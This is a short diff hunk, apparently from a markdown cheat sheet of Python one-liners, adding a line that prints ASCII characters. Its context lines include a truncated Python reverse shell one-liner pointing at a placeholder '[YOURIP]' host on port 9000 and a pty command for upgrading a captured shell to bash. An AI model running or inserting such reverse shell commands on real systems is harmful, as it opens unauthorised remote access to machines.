@@ -18,3 +18,7 @@ python -c "import socket,subprocess,os;host=\"[YOURIP]\";port=9000;s=socket.sock
 **Spawn bash shell prompt**
 ```python
 python -c 'import pty; pty.spawn("/bin/bash")'```
+
+***Print all ASCII characters***
+```python
+python -c 'import string; print string.printable'```
